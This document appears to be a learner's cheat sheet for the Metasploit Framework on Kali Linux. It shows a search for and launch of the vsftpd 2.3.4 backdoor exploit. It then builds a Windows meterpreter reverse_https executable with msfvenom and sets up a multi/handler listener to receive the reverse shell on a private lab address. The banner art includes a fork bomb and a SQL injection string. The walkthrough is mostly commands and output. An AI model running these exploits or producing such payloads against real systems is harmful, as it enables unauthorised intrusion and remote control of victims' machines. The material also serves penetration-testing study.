METASPLOIT FRAMEWORK

to start METASPLOIT


┌──(kali㉿kali)-[~]
└─$ msfconsole                                                  

if we want to search particular exploid
msf6 >  search vsftpd
  

msf6 > search platform: windows


USE OF ANY EXPLOID

1st:
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

if we want to back just type "back"

2nd:
msf6 > use 1
[*] Using configured payload cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 

THAN 

for information type "info"

for options type "options"

to set RHOSTS type "set RHOSTS 1.1.1.1"  (1.1.1.1  is target ip)
than check options
to unset RHOSTS type "unset RHOSTS 1.1.1.1"

if we want to check targets type "show targets"

if we want execute type "run" or "exploid"

if we want search auxiliary type "search type: auxiliary ssh"
  



TO CREATE STAGED PAYLOADS:
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ msfvenom -p windows/meterpreter/reverse_https LHOST=10.0.2.15 LPORT=4444 -f exe -o windows_payloads.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 528 bytes
Final size of exe file: 73802 bytes
Saved as: windows_payloads.exe
                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ msfconsole                                                                                              
Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it 
with setg RHOSTS x.x.x.x
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:                                               
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                                               
                      :09.14.2011.raid                       /STFU|wall.No.Pr:                                               
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                                               
                      :#OUTHOUSE-  -s:                       /corykennedyData:                                               
                      :$nmap -oS                              SSo.6178306Ence:                                               
                      :Awsm.da:                            /shMTl#beats3o.No.:                                               
                      :Ring0:                             `dDestRoyREXKC3ta/M:                                               
                      :23d:                               sSETEC.ASTRONOMYist:                                               
                       /-                        /yo-    .ence.N:(){ :|: & };:                                               
                                                 `:Shall.We.Play.A.Game?tron/                                                
                                                 ```-ooy.if1ghtf0r+ehUser5`                                                  
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                    
                                              `MjM~~WE.ARE.se~~MMjMs                                                         
                                               +~KANSAS.CITY's~-`                                                            
                                                J~HAKCERS~./.`                                                               
                                                .esc:wq!:`                                                                   
                                                 +++ATH`                                                                     
                                                  `                                                                          
                                                                                                                             

       =[ metasploit v6.4.56-dev                          ]
+ -- --=[ 2505 exploits - 1288 auxiliary - 431 post       ]
+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit Documentation: https://docs.metasploit.com/

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https

msf6 exploit(multi/handler) > set LHOST 10.0.2.15
LHOST => 10.0.2.

msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/handler) > exploit
